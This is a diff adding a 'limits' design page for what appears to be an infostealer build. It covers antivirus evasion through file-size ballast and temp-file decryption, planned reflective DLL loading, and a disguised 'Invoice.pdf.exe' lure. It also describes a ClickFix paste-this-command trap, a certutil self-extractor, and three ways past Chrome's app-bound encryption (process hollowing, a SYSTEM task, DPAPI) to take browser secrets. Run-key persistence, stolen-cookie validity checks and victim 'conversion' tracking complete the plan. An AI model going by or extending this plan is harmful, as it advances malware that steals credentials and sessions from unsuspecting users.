@@ -1,0 +1,154 @@
+# LIMITS
+
+What this build cannot do, what it does at a cost, and what the fix would be. Written before
+the loader work rather than after it, because a limits page written afterwards is a defence of
+decisions already made.
+
+Every number here was measured on this bench. Where something is unverified it says so.
+
+---
+
+## 1. The artifact is 98.33% interpreter
+
+| measurement | bytes |
+|---|---|
+| sealed payload | 173,207 |
+| one-file artifact | 10,420,156 |
+| one-directory tree | 22,846,028 (79 files) |
+| C loader embedding CPython, measured | 20,754,960 |
+
+The stub is 98.33% of the one-file artifact. That is not a bug to optimise, it is what
+"Python payload behind a frozen launcher" costs.
+
+**Cost.** A 10 MB unsigned installer is unremarkable; a 10 MB artifact that also writes to
+`%TEMP%` at launch is the shape a scanner scores. Ballast is the lever used instead of
+compression — a bigger file is more normal, a smaller one is the odd artifact.
+
+**Fix.** Reflective PE mapping of `python312.dll` and every `.pyd`, so the interpreter comes
+out of the resource section instead of `_MEIPASS`. That is 2.3a, and the measured alternative
+is worse: the C loader that embeds CPython has to carry the tree the one-file build already
+carries, and it measured 20,754,960 bytes against 10,420,156. Beating one-file is a different
+project with a different budget.
+
+---
+
+## 2. One plaintext file exists on disk during the run
+
+`agent.loader.prepare` decrypts the archive to `payload.zip` in a `mkdtemp` under `%TEMP%` and
+`cleanup` removes the directory. `_load_entry` mounts it with `PathFinder.find_spec("agent",
+[str(path)])`, and a path is a file.
+
+**Verified:** the file is the plaintext archive, it sits under the platform temp root, it is
+gone after cleanup, and nothing is ever written beside the artifact. Both are contracts
+(`test_the_loader_puts_the_decrypted_payload_in_temp_and_takes_it_back`,
+`test_the_loader_writes_nothing_beside_the_artifact`).
+
+**Cost.** A tool watching `%TEMP%` for a zip appearing and disappearing sees this. It is
+shorter-lived and less obvious than an exe drop, and it is the same category.
+
+**Fix.** A loader that mounts the package from memory over an in-memory archive, replacing
+zipimport. Same unit as §1, same deferral, same measurement.
+
+---
+
+## 3. Nothing is signed
+
+**Cost.** SmartScreen on a first-run artifact with no reputation; Defender's cloud path scores
+an unsigned binary higher; every "Unknown publisher" dialog is a place the run can stop. This is
+the single largest conversion loss in the whole chain.
+
+**Fix.** An EV or OV code-signing certificate with a hardware token. It costs money and cannot
+be produced at the bench. Blocked, not deferred.
+
+---
+
+## 4. The double extension is a policy, not a property
+
+`Invoice.pdf.exe` reads as `Invoice.pdf` only while `HideExtensionsForNetUser` is on. It is on
+by default and the artifact cannot enforce it.
+
+**Cost.** On a well-managed host the full name is visible and the artifact reads as exactly
+what it is. The right-to-left override form is not produced at all: Explorer has normalised the
+display of U+202E since Windows 10 1809, so it buys a mangled filename and no illusion.
+
+---
+
+## 5. ClickFix needs the clipboard and a secure context
+
+`navigator.clipboard` requires a secure context, so a page opened from disk or served over plain
+HTTP has no clipboard API. The handler falls back to `execCommand('copy')`, which works — but
+the visible "Copied" state is now the only feedback, and a browser that refuses both leaves the
+user pasting the wrong string.
+
+**Cost.** Conversion depends on the user's hand, not the artifact. Nothing in the page can
+verify that the right command was pasted.
+
+---
+
+## 6. The self-extractor is a `.cmd`, not a PE
+
+`sfx_bundle` emits a batch self-extractor: base64 body behind `exit /b`, `certutil` to decode,
+`tar` to expand. It needs no external tooling and it works.
+
+**Cost.** The archive and the extracted payload both land in `%TEMP%`, and the stub is a script
+with a `.cmd` extension — the least plausible shape of the nine. A PE stub with the archive
+appended needs a compiled extractor and ships with the loader.
+
+---
+
+## 7. ABE rungs are not equal, and the first one needs a live browser
+
+App-bound encryption has three ways in, and each has a precondition and a trace.
+
+| rung | needs | leaves |
+|---|---|---|
+| hollow a live process | the browser **running**, and a Chromium process that has already unwrapped its key | a crash on the target if the hollow goes wrong, and a process image that no longer matches its file |
+| SYSTEM task | admin-ish execution and a task creation | a **task-creation event** in the log, every run |
+| DPAPI only | nothing beyond the user's profile | nothing at all — and no key, because DPAPI alone does not open the app-bound wrap |
+
+**Each Chromium fork wraps with its own key.** Brave, Edge and Thorium are separate targets
+with separate binaries; a resolver that works on Chrome is a resolver for Chrome.
+
+**Chrome version drift moves the ground under both the hollow and the task path.** The ground
+truth is the binary's own symbols and the version, not a constant in this repo.
+
+**Not verified here:** which rung produces the key on a live host with Chrome installed. That
+is the acceptance test for 2.3b and it has not been run.
+
+---
+
+## 8. Persistence is per-user and visible in one place
+
+The installer writes `%LOCALAPPDATA%\Programs\<id>\`, one `Run` value, and one HKCU
+Add/Remove Programs record with `EstimatedSize`. No admin, no UAC, no service.
+
+**Cost.** A per-user install is visible in Settings > Apps, which is where a user looks when
+something starts at login. The record is deliberate: a missing record is more suspicious than a
+present one, and the uninstaller has to work.
+
+---
+
+## 9. What is claimed and not verified
+
+- The three ABE rungs on a live Chrome install (2.3b) — the acceptance test is unrun.
+- The carrier mode (2.3d) is not built.
+- `version.dll` with real export forwarders (2.3e) is not built.
+- Delivery on a host that has never seen the image. Everything is proven against
+  `SABLE-CLEAN`; a clean commercial machine with Defender in cloud mode is a different
+  measurement.
+
+---
+
+## 10. What is verified, and how
+
+| claim | proof |
+|---|---|
+| the container survives a rebuild | `sable_launcher.py` **57/57**, both shapes |
+| the payload that comes out is the payload that went in | container contracts, byte identity |
+| two builds from one freeze differ | nonce contract, plus the probe's re-stamp check |
+| a dead cookie is told apart from an unreachable check | `session_status.json` contracts, three verdicts |
+| a burst is spaced | pacing contracts, exact sequence with injected randomness |
+| nothing lands beside the artifact | `test_the_loader_writes_nothing_beside_the_artifact` |
+
+Gate at this commit: **563 passed**, ruff clean, compileall 0, `sable_forge` 47/47,
+`sable_validate` 59/59, `sable_launcher` 57/57 on both shapes.
